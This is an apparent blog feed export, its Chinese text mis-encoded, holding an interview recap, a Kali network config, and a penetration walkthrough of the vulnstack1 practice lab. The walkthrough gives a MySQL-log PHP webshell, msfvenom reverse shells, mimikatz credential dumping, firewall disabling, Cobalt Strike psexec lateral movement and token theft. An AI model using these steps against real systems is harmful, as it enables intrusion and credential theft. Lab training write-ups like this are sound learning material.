<p>æˆ‘è¯´äº†ä¸‹ä¹‹å‰4æœˆä»½æœ‰æ¥è§¦è¿‡sstiï¼Œä½†æ˜¯é—®æˆ‘sstiçš„åŸç†çš„æ—¶å€™å°±æƒ³ä¸å‡ºæ¥äº†â€¦(åœ¨ä¸æ­£ç¡®ä½¿ç”¨æ¨¡æ¿å¼•æ“è¿›è¡Œæ¸²æŸ“æ—¶ï¼Œä¼šé€ æˆæ¨¡æ¿æ³¨å…¥)</p>
<p>9.XSSåˆ†ç±»ï¼Œè¯´ä¸€ä¸‹å¼¹xssçš„è¯­å¥æœ‰å“ªäº›?</p>
<p>åå°„å‹ï¼Œå­˜å‚¨å‹ï¼ŒDOMå‹</p>
<p>ç„¶åæˆ‘å°±è¯´äº†å¯ä»¥ç”¨script JavaScript frame ä¹‹ç±»çš„ï¼Œç„¶åå¸ˆå‚…è®©æˆ‘è¯´ä¸‹å…·ä½“çš„å†™æ³•ï¼Œç„¶åå°±ç®€å•è¯´äº†ä¸‹ï¼Œå¸ˆå‚…è¯´è¿™æ ·å†™çš„è¯å¤§å¤šæ•°æ˜¯æ— æ³•æ‰§è¡Œçš„</p>
<p>10.csrfå’Œssrfå“ªä¸ªå±å®³æ›´å¤§ä¸€äº›ï¼Ÿssrfè¯¥å¦‚ä½•é˜²å¾¡</p>
<p>ssrfå¯ä»¥å†…å®¹è¯»å–ï¼Œæ¢æµ‹å†…ç½‘ï¼›csrfå¯ä»¥ç›—å–cookieï¼Œç„¶åæˆ‘è¯´åº”è¯¥æ˜¯csrfå§ï¼ˆè™½ç„¶çŸ¥é“ä»–ä»¬çš„ä½œç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯æ‹¿ä¸å®šä¸»æ„ï¼‰ç„¶åå¸ˆå‚…æœ‰é—®äº†ä¸‹æ‰ç¡®å®šæ˜¯ssrfå±å®³å¤§ã€‚</p>
<p>ç„¶åé—®ssrfå¦‚ä½•é˜²å¾¡</p>
<p>11.æ³„æ¼ç±»é¢˜ç›®æœ‰æ¥è§¦è¿‡å—ï¼Œæ¥è§¦è¿‡å“ªäº›</p>
<p>å½“æ—¶åªæƒ³åˆ°äº†gitæ³„æ¼ï¼Œé¢è¯•å®Œçªç„¶æƒ³åˆ°äº†svnæ³„æ¼å’ŒDS_storeæ³„æ¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.hgæºç æ³„æ¼</span><br><span class="line">.gitæºç æ³„éœ²</span><br><span class="line">.DS_Storeæ³„æ¼</span><br><span class="line">svnæ³„æ¼</span><br></pre></td></tr></table></figure>

<p>12.æœ‰ä»€ä¹ˆé—®é¢˜è¦æé—®å—</p>
<p>å½“æ—¶åªæƒ³åˆ°äº†åˆšæ‰é—®çš„sleepå‡½æ•°çš„æ›¿ä»£å‡½æ•°â€¦.åˆ«çš„éƒ½æƒ³ä¸èµ·æ¥äº†ï¼Œå¤§è„‘ä¸€ç‰‡ç©ºç™½â€¦â€¦.</p>
<br>

<hr>
<p>æ„Ÿè§‰åº”è¯¥æ˜¯å‡‰å‡‰äº†ï¼Œé¢è¯•æŒºçªç„¶çš„ï¼Œæ²¡åšå•¥å‡†å¤‡ï¼Œè€Œä¸”è¿™ä¸ªå®ä¹ æ˜¯æ¯”èµ›æ–¹é¢çš„ï¼Œä½œä¸ºç­¾åˆ°å‹é€‰æ‰‹å‡ ç‡æ›´æ¸ºèŒ«äº†â€¦wuwuwuâ€¦.å…ˆæŠŠçº¢æ—¥é¶åœºæå®Œï¼Œå¥½å¥½å‡†å¤‡ç§‹æ‹›äº†ï¼</p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>kalié…ç½®åŒç½‘å¡</title>
    <url>/posts/47c05aa1/</url>
    <content><![CDATA[<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo  vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line"> </span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.128</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.0.2</span><br><span class="line"></span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet static</span><br><span class="line">address 192.168.72.130</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;ä¿å­˜å</span><br><span class="line">sudo service networking  restart     </span><br><span class="line">ifconfig</span><br><span class="line">reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack1é¶åœº</title>
    <url>/posts/bb76ba56/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali        VM2,NAT             192.168.72.130,192.168.0.128</span><br><span class="line">win7        VM2,VM1,NAT         192.168.52.143,192.168.72.129,192.168.0.178</span><br><span class="line">win2k3      VM1                 192.168.52.141</span><br><span class="line">winServer08 VM1                 192.168.52.138</span><br></pre></td></tr></table></figure>

<p>é€šç”¨å¯†ç ä¸º <code>hongrisec@2019</code> æ›´æ”¹åçš„å¯†ç ä¸º<code>hongrisec@2021</code></p>
<p>win7å¯ä»¥pingé€šæ‰€æœ‰ä¸»æœºï¼Œä½†æ‰€æœ‰ä¸»æœºéƒ½æ— æ³•pingé€šwin7(win7é˜²ç«å¢™è¿‡æ»¤äº†icmp,å¼€å¯æ–‡ä»¶å’Œæ‰“å°æœºå›æ˜¾ imcpv4å³å¯pingé€š)</p>
<p>win2003ä¸win2008äº’é€š</p>
<p>(ä¹‹å‰é€‰æ‹©win7ç½‘ç»œæ˜¯é€‰æˆäº†å®¶åº­ç½‘ç»œå¯¼è‡´æ— æ³•åœ¨å…¶ä»–ä¸»æœºè®¿é—®webæœåŠ¡ï¼Œæ”¹ä¸ºå…¬ç”¨ç½‘ç»œå°±iå¥½äº†;ä½¿ç”¨VM1å’ŒNatæ¨¡å¼çš„win7åŸŸé…ç½®æœ‰ç‚¹é—®é¢˜ï¼Œç„¶åå°±åœ¨åé¢å†…ç½‘æ¸—é€çš„æ—¶å€™é‡æ–°è®¾ç½®äº†ï¼Œç»™kaliå’Œwin7é…ç½®äº†VM2ç½‘å¡)</p>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><code>nmap 192.168.0.178 -sS -Pn</code> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-13 20:31 CST</span><br><span class="line">Nmap scan report for 192.168.0.178</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">3306&#x2F;tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:63:00:E0 (VMware)</span><br></pre></td></tr></table></figure>

<p>å¼€æ”¾äº†80ç«¯å£ å’Œ 3306ç«¯å£</p>
<p>è®¿é—®80ç«¯å£ï¼Œé»˜è®¤é¡µé¢ä¸ºphpstudyæ¢é’ˆï¼Œå¾—åˆ°ç½‘ç«™ç»å¯¹è·¯å¾„ä¸º<code>C:/phpStudy/WWW </code> è¿˜æœ‰ä¸€ä¸ªmysqlæ•°æ®åº“è¿æ¥æ£€æµ‹ï¼Œè¾“å…¥root,root æ˜¾ç¤ºæˆåŠŸè¿æ¥æ•°æ®åº“,å¯ä»¥ç¡®å®šå¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ä¸º <code>root</code>  <code>root</code></p>
<h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p><code>sudo dirb http://192.168.0.178</code>  dirmapåªæ‰«æå‡ºäº†phpmyadmin</p>
<p><code>sudo python3 dirsearch.py -u http://192.168.0.178 -e */</code> dirsearchä¹Ÿåªæ‰«å‡ºæ¥äº†phpmyadmin</p>
<p><code>sudo python3 dirmap.py  -i 192.168.0.178 -lcf</code> ä½¿ç”¨dirmap æ‰«åˆ°äº†å¤‡ä»½æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[200][application&#x2F;x-rar-compressed][3.00mb] http:&#x2F;&#x2F;192.168.0.178&#x2F;beifen.rar         </span><br><span class="line">[200][text&#x2F;html][70.39kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpinfo.php                          </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][4.28kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpMyAdmin&#x2F;            </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][4.28kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpMyadmin&#x2F;            </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][4.28kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpmyadmin&#x2F;            </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][4.28kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpmyAdmin&#x2F;            </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][14.39kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;&#x2F;l.php  </span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="åå°ä¸Šä¼ shell"><a href="#åå°ä¸Šä¼ shell" class="headerlink" title="åå°ä¸Šä¼ shell"></a>åå°ä¸Šä¼ shell</h4><p>ä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œå‘ç°ä¸ºyxcms</p>
<p>è®¿é—® <code>192.168.0.178/yxcms</code>,ä¸»é¡µä¸­æœ‰æ•æ„Ÿä¿¡æ¯æ³„æ¼</p>
<p><img src="/posts/bb76ba56/info.png"></p>
<p>å¾—åˆ°åå°åœ°å€å’Œç™»å½•è´¦å·</p>
<p>åœ¨å‰å°æ¨¡æ¿å¤„ï¼Œå¯ä»¥æ–°å¢phpæ–‡ä»¶,åˆ›å»ºä¸€ä¸ªshell1.php</p>
<p><img src="/posts/bb76ba56/shell1php.png"></p>
<p>é€šè¿‡ä¹‹å‰ä¸‹è½½çš„å¤‡ä»½æ–‡ä»¶æ‰¾ä¸€ä¸‹shell1.phpçš„æ–‡ä»¶è·¯å¾„</p>
<p><img src="/posts/bb76ba56/sehll1dir.png"></p>
<p>æ‰¾åˆ°shellçš„æ–‡ä»¶è·¯å¾„ä¸º<code>yxcms/protected/apps/default/view/default/</code></p>
<p>è®¿é—®<code>http://192.168.0.178/yxcms/protected/apps/default/view/default/shell1.php?cmd=phpinfo();</code>æˆåŠŸä¸Šä¼ shell</p>
<p><img src="/posts/bb76ba56/shell_phpinfo.png"></p>
<p>ä½¿ç”¨èšå‰‘è¿æ¥shell</p>
<p><img src="/posts/bb76ba56/ant_shell.png"></p>
<h4 id="phpmyadminåˆ©ç”¨æ—¥å¿—Getshell"><a href="#phpmyadminåˆ©ç”¨æ—¥å¿—Getshell" class="headerlink" title="phpmyadminåˆ©ç”¨æ—¥å¿—Getshell"></a>phpmyadminåˆ©ç”¨æ—¥å¿—Getshell</h4><p>å¼±å£ä»¤<code>root</code>  <code>root</code>æˆåŠŸç™»å½•</p>
<p>æŸ¥çœ‹æ˜¯å¦æœ‰å†™å…¥æƒé™ <code>show variables like &#39;%secure_file%&#39;;</code></p>
<p>secure_file_priv å€¼ä¸º NULLï¼Œä¸èƒ½ä½¿ç”¨ into outfile æ–¹å¼å†™å…¥ shell</p>
<p><img src="/posts/bb76ba56/phpmy1.png"></p>
<p>æ‰‹åŠ¨å¼€å¯æ—¥å¿—è®°å½•</p>
<p><img src="/posts/bb76ba56/phpmy2.png"></p>
<p>æŸ¥çœ‹å½“å‰æ—¥å¿—ç›®å½•</p>
<p><img src="/posts/bb76ba56/phpmy3.png"></p>
<p>æŒ‡å®šæ—¥å¿—æ–‡ä»¶</p>
<p><code>set global general_log_file = &quot;C:/phpStudy/www/1.php&quot;;</code></p>
<p>å†æ¬¡æŸ¥çœ‹æ—¥å¿—ç›®å½•</p>
<p><code>show variables like &#39;general%&#39;;</code></p>
<p><img src="/posts/bb76ba56/phpmy4.PNG"></p>
<p>å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥æŒ‡å®šçš„1.php</p>
<p><code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code></p>
<p><img src="/posts/bb76ba56/phpmy5.PNG"></p>
<p><img src="/posts/bb76ba56/phpmy6.PNG"></p>
<h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><h4 id="ä½¿ç”¨msf"><a href="#ä½¿ç”¨msf" class="headerlink" title="ä½¿ç”¨msf"></a>ä½¿ç”¨msf</h4><p>æ‰“å¼€msfè¿›è¡Œæœ¬æœºç›‘å¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.72.130</span><br><span class="line">set lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨msfvenomç”Ÿæˆshell.exe</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.72.130 lport=9999 -f exe -o shell.exe</code></p>
<p>ç„¶åä½¿ç”¨èšå‰‘ä¸Šä¼ shell.exeåæ‰§è¡Œ</p>
<p>æˆåŠŸåœ¨msfä¸Šæ”¶åˆ°åå¼¹shell</p>
<p><img src="/posts/bb76ba56/msf_shell.png"></p>
<p><code>getuid</code>æŸ¥çœ‹å½“å‰æƒé™</p>
<p>ä½¿ç”¨<code>getsystem</code>æˆåŠŸææƒ</p>
<p><img src="/posts/bb76ba56/msf_getsystem.png"></p>
<p>ä½¿ç”¨<code>sysinfo</code>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</p>
<p><img src="/posts/bb76ba56/msf_sysinfo.png"></p>
<p>ä½¿ç”¨<code>ps</code>æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹,æ‰¾ä¸€ä¸ªx64çš„è¿›ç¨‹ï¼Œç”¨æˆ·ä¸º<code>NT AUTHORITY\SYSTEM</code>,è¿™æ ·è¿ç§»åmeterpreterçš„æƒé™æ˜¯è¿ç§»åˆ°çš„è¿›ç¨‹çš„æƒé™ï¼Œåœ¨æ­¤æ¬¡é€‰æ‹©ä½¿ç”¨idä¸º400çš„è¿›ç¨‹è¿›è¡Œè¿ç§»</p>
<p><img src="/posts/bb76ba56/msf_ps.png"></p>
<p><img src="/posts/bb76ba56/msf_migrate400.png"></p>
<p>ä½¿ç”¨<code>getpid</code> æŸ¥çœ‹å½“å‰Meterpreter Shellçš„è¿›ç¨‹PID</p>
<p>åŠ è½½mimikatzæ¨¡å—<code>load mimikatz</code></p>
<p><img src="/posts/bb76ba56/msf_loadmimikatz_error.png"></p>
<p>æ ¹æ®æç¤ºï¼Œmimikatzæ¨¡å—å·²ç»è¢«kiwiæ‰€å–ä»£</p>
<p>ä½¿ç”¨<code>help kiwi</code>å¯ä»¥æŸ¥çœ‹å¸®åŠ©</p>
<p>åœ¨ä½¿ç”¨wikiçš„æ—¶å€™éœ€è¦å…ˆè¿ç§»è¿›ç¨‹ä¸ç„¶ä¼šæ— æ³•æ­£å¸¸è¿è¡Œ</p>
<p><img src="/posts/bb76ba56/msf_kiwi_nomigrate.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">help kiwi</span><br><span class="line"></span><br><span class="line">creds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ®</span><br><span class="line">creds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ®</span><br><span class="line">creds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ®</span><br><span class="line">creds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ®</span><br><span class="line">creds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ®</span><br><span class="line">creds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ®</span><br><span class="line">dcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯</span><br><span class="line">dcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID</span><br><span class="line">golden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ®</span><br><span class="line">kerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ®</span><br><span class="line">kiwi_cmdï¼šæ‰§è¡Œmimikatzçš„å‘½ä»¤ï¼Œåé¢æ¥mimikatz.exeçš„å‘½ä»¤</span><br><span class="line">lsa_dump_samï¼šdumpå‡ºlsaçš„SAM</span><br><span class="line">lsa_dump_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡</span><br><span class="line">password_changeï¼šä¿®æ”¹å¯†ç </span><br><span class="line">wifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶</span><br><span class="line">wifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶&#x2F;ç¼–ç </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>creds_all</code> å‘½ä»¤ç›´æ¥è·å–å¯†ç </p>
<p><img src="/posts/bb76ba56/msf_kiwi_creds_all.png"></p>
<p>ä½¿ç”¨<code>kiwi_cmd</code>åé¢æ¥mimikatz.exeçš„å‘½ä»¤</p>
<p><code>kiwi_cmd sekurlsa::logonpasswords</code>å¯ä»¥å¾—åˆ°å¯†ç <code>hongrisec@2021</code></p>
<p><img src="/posts/bb76ba56/msf_kiwi_cmd.png"></p>
<p>è¿›å…¥shell <code>netstat -ano | findstr &quot;3389&quot;</code>æŸ¥çœ‹3389ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œshellçªç„¶æ²¡äº†ç›¸åº”â€¦ç„¶åå‘ç°é¶æœºipè‡ªåŠ¨å˜äº†..</p>
<p>ä½¿ç”¨msfå¼€å¯3389ç«¯å£</p>
<p>meterpreter &gt;<code> run post/windows/manage/enable_rdp</code></p>
<p><img src="/posts/bb76ba56/msf_run_rdp.png"></p>
<p>(æ³¨ï¼šè¿è¡Œå®Œè¯¥å‘½ä»¤åçªç„¶å‘ç°è¿æ¥ä¸ä¸Šshelläº†ï¼Œå»é¶æœºçœ‹äº†ä¸‹ ç½‘å¡å¼€å¯çš„è‡ªåŠ¨è·å–ipï¼Œæ‰“å¼€3389ä¹‹åä¸çŸ¥é“ä¸ºä»€ä¹ˆå°±è‡ªå·±æ¢äº†ipï¼Œç„¶åå°±åœ¨é¶æœºä¸Šè®¾ç½®äº†å›ºå®šip ä¸º <code>192.168.72.136</code>)</p>
<p>ç„¶åå†kaliä¸Šå°è¯•è¿œç¨‹è¿æ¥é¶æœº</p>
<p><code>sudo rdesktop 192.168.72.136</code> è¾“å…¥yes</p>
<p>ä½¿ç”¨<code>God\Administrator </code> <code>hongrisec@2021</code>æˆåŠŸç™»å½•</p>
<p><img src="/posts/bb76ba56/msf_rdesktop.png"></p>
<hr>
<h4 id="ä½¿ç”¨CSè¿æ¥"><a href="#ä½¿ç”¨CSè¿æ¥" class="headerlink" title="ä½¿ç”¨CSè¿æ¥"></a>ä½¿ç”¨CSè¿æ¥</h4><p>åœ¨CSä¸­åˆ›å»ºbeacon httpç›‘å¬ï¼Œ</p>
<p>ç„¶åé€‰æ‹©æ”»å‡»-&gt;ç”Ÿäº§åé—¨-&gt;Windows Executable(s),é€‰æ‹©åˆšæ‰åˆ›å»ºçš„Listenerç”Ÿæˆ1.exe</p>
<br>

<p>åœ¨èšå‰‘ä¸­å…³é—­é˜²ç«å¢™</p>
<p><code>netsh advfirewall set allprofiles state off</code></p>
<p>å°†ç”Ÿæˆçš„exeåœ¨èšå‰‘ç»ˆç«¯è¿è¡Œ</p>
<p>åœ¨Cobalt Strikeä¸­å®ƒçš„å¿ƒè·³é»˜è®¤æ˜¯60s(å³sleepæ—¶é—´ä¸º60sï¼Œæ¯ä¸€åˆ†é’Ÿç›®æ ‡ä¸»æœºä¸teamserveré€šä¿¡ä¸€æ¬¡), è¿™ä¼šè®©æ‰§è¡Œå‘½ä»¤æˆ–è¿›è¡Œå…¶ä»–æ“ä½œå“åº”å¾ˆæ…¢</p>
<p><code>sleep 5</code> è®¾ç½®æ—¶é—´ä¸º5sï¼Œå¦‚æœè®¾ç½®å€¼è¿‡å°ï¼Œæµé‡ä¼šå¾ˆæ˜æ˜¾ ã€‚</p>
<h5 id="ç³»ç»Ÿä¿¡æ¯æ”¶é›†"><a href="#ç³»ç»Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯æ”¶é›†"></a>ç³»ç»Ÿä¿¡æ¯æ”¶é›†</h5><p><code>shell whoami</code></p>
<p><code>shell net user</code></p>
<p><img src="/posts/bb76ba56/wininfo1.png"></p>
<p><code>shell net user /domain</code></p>
<p><img src="/posts/bb76ba56/shell_net_user_domain.png"></p>
<p><code>shell ipconfig /all</code></p>
<p><img src="/posts/bb76ba56/wininfo2.PNG"></p>
<p><img src="/posts/bb76ba56/wininfo3.PNG"></p>
<p><code>shell systeminfo </code></p>
<p><img src="/posts/bb76ba56/cs_shellsysteminfo.png"></p>
<p><img src="/posts/bb76ba56/cs_shellsysteminfo2.PNG"></p>
<p><code>shell net view</code></p>
<blockquote>
<p>net view å‘½ä»¤å‡ºç°6118é”™è¯¯è§£å†³æ–¹æ³•:å…³é—­é˜²ç«å¢™</p>
<p>netsh advfirewall set allprofiles state off</p>
</blockquote>
<p><img src="/posts/bb76ba56/cs_shellnetview.png"></p>
<p>æŸ¥çœ‹ä¸»åŸŸä¿¡æ¯ <code>shell net view /domain</code></p>
<p><img src="/posts/bb76ba56/cs_netview_domain.png"></p>
<p>æŸ¥çœ‹æ—¶é—´ <code>net time /domain</code></p>
<p><img src="/posts/bb76ba56/net_view_time_domain.png"></p>
<p>æŸ¥è¯¢å½“å‰çš„ç™»å½•åŸŸä¸ç”¨æˆ·ä¿¡æ¯<code>net config workstation</code></p>
<p><img src="/posts/bb76ba56/net_config_workstation.png"></p>
<p>æ‰§è¡ŒCSä¸­çš„<code>net view</code></p>
<p><img src="/posts/bb76ba56/cs_netview.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åŸŸ: god.org</span><br><span class="line">åŸŸå†…ä¸»æœº: OWA   192.168.52.138</span><br><span class="line">          ROOT-TVI862UBEH   192.168.52.141</span><br><span class="line">          STU1(win7)  192.168.52.143</span><br><span class="line">åŸŸå†…ç”¨æˆ·: Administrator</span><br><span class="line">          ligang</span><br><span class="line">          liukaifeng01</span><br><span class="line">åŸŸæ§: OWA 192.168.52.138</span><br></pre></td></tr></table></figure>

<h5 id="ç³»ç»Ÿå¯†ç æ”¶é›†"><a href="#ç³»ç»Ÿå¯†ç æ”¶é›†" class="headerlink" title="ç³»ç»Ÿå¯†ç æ”¶é›†"></a>ç³»ç»Ÿå¯†ç æ”¶é›†</h5><p>åœ¨CSä¸­ä½¿ç”¨<code>hashdump</code>   <code>logonpasswords</code>  è¯»å–å†…å­˜å’Œå¯†ç </p>
<p><img src="/posts/bb76ba56/password1.png"></p>
<p>å¾—åˆ°hashå€¼å’Œæ˜æ–‡å¯†ç ï¼Œå¯†ç ä¸º <code>hongrisec@2021</code></p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨CSä¸­çš„<code>Run mimikatz</code></p>
<p><img src="/posts/bb76ba56/run_mimikatz.png"></p>
<p>æŠ“åˆ°çš„ç»“æœå¯ä»¥åœ¨<code>View -&gt;  Credentials</code>ä¸­æŸ¥çœ‹</p>
<p><img src="/posts/bb76ba56/Credentials.png"></p>
<br>

<h5 id="æ¨ªå‘æ¢æµ‹"><a href="#æ¨ªå‘æ¢æµ‹" class="headerlink" title="æ¨ªå‘æ¢æµ‹"></a>æ¨ªå‘æ¢æµ‹</h5><p>ä½¿ç”¨CSä¸­çš„<code>net view</code>å’Œ<code>port scan</code> åŠŸèƒ½</p>
<p><img src="/posts/bb76ba56/cs_netview.png"></p>
<p><img src="/posts/bb76ba56/cs_portscan.png"></p>
<p>æ‰«æå‡ºæ¥çš„å†…å®¹å¯ä»¥åœ¨targetä¸­çœ‹åˆ°</p>
<p><img src="/posts/bb76ba56/cs_target.png"></p>
<h6 id="ä½¿ç”¨CSçš„psexec"><a href="#ä½¿ç”¨CSçš„psexec" class="headerlink" title="ä½¿ç”¨CSçš„psexec"></a>ä½¿ç”¨CSçš„psexec</h6><p>1.å…ˆåˆ›å»ºä¸€ä¸ªsmb beacon</p>
<p><img src="/posts/bb76ba56/cs_new_smbbeacon.png"></p>
<p>2.åœ¨å·²æœ‰çš„Beaconä¸Šå³é”®é€‰æ‹©Spawnmï¼Œé€‰æ‹©smb beaconçš„listener</p>
<p><img src="/posts/bb76ba56/cs_smb.png"></p>
<p>ç„¶ååç”Ÿæˆæ´¾ç”Ÿçš„smb beacon</p>
<p><img src="/posts/bb76ba56/cs_psexec1.png"></p>
<p><img src="/posts/bb76ba56/cs_psexec2.PNG"></p>
<p>3.ä½¿ç”¨å‡­è¯è¿æ¥å…¶ä»–å†…ç½‘æœºå™¨</p>
<p>åœ¨Targetsä¸­ é€‰æ‹©ä¸»æœºå³é”®<code>jump</code>-&gt; <code>psexec</code></p>
<p><img src="/posts/bb76ba56/cs_psexec3.PNG"></p>
<p><img src="/posts/bb76ba56/cs_psexec4.PNG"></p>
<p>æˆåŠŸç”¨æ­¤æ–¹æ³•è¿æ¥åˆ°OWAçš„beacon</p>
<p>ä½†æ˜¯åœ¨è¿æ¥ ROOT-TVI862UBEHæ—¶ï¼Œä¼šæŠ¥é”™ï¼Œå…·ä½“åŸå› è¿˜æ²¡æ‰¾åˆ°â€¦.æ±‚è§£å†³</p>
<p><img src="/posts/bb76ba56/cs_psexec_error.png"></p>
<p>4.å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡çªƒå–GOD\Administratorçš„tokenæ¥ç™»å½•å…¶ä»–ä¸»æœº</p>
<p>é€‰æ‹©beaconå³é”®-&gt;Explore-&gt;Process List-&gt;æ‰¾åˆ°GOD\Administratorçš„è¿›ç¨‹ ç‚¹å‡»å³ä¸‹è§’çš„<code>steal token</code></p>
<p>ç„¶åè¿›å…¥targets-&gt;jump-&gt;psexec-&gt;å‹¾é€‰å·¦ä¸‹æ–¹çš„å‹¾ ä½¿ç”¨å½“å‰ä¼šè¯çš„tokenï¼Œè¿™ç§æ–¹æ³•å’Œå‰é¢çš„æ•ˆæœç›¸åŒ</p>
<br>

<h5 id="CSæ´¾ç”Ÿmsfä¼šè¯"><a href="#CSæ´¾ç”Ÿmsfä¼šè¯" class="headerlink" title="CSæ´¾ç”Ÿmsfä¼šè¯"></a>CSæ´¾ç”Ÿmsfä¼šè¯</h5><p>åœ¨CSä¸­åˆ›å»ºä¸€ç»™Foreign HTTP(s)</p>
<p><img src="/posts/bb76ba56/cs_msf1.png"> </p>
<p>åœ¨msfä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set &#x3D;&gt; payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.72.130</span><br><span class="line">lhost &#x3D;&gt; 192.168.72.130</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 2222</span><br><span class="line">lport &#x3D;&gt; 2222</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb76ba56/cs_msf2.png"></p>
<br>

<p>ä½¿ç”¨<code>run autoroute -s 192.168.72.0/24</code>æŠ¥é”™ åº”è¯¥æ˜¯åœ¨msf6ä¸­ç§»é™¤äº†</p>
<p><code>use post/multi/manage/autoroute</code> é€‰æ‹©autorouteæ¨¡å—æ·»åŠ è·¯ç”±</p>
